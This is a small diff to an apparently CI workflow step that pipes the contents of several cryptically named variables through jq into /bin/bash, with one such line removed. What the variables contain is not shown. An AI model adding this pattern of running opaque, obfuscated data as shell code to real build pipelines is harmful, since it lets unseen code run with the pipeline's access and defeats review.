@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$qw43" | jq -r .qz24102 | /bin/bash
           echo $b526 | jq -r .mrl73 | /bin/bash
-          echo $dkxv3063 | jq -r .p1071 | /bin/bash
           echo $nh060 | jq -r .t069 | /bin/bash
 
       - name: Persist output
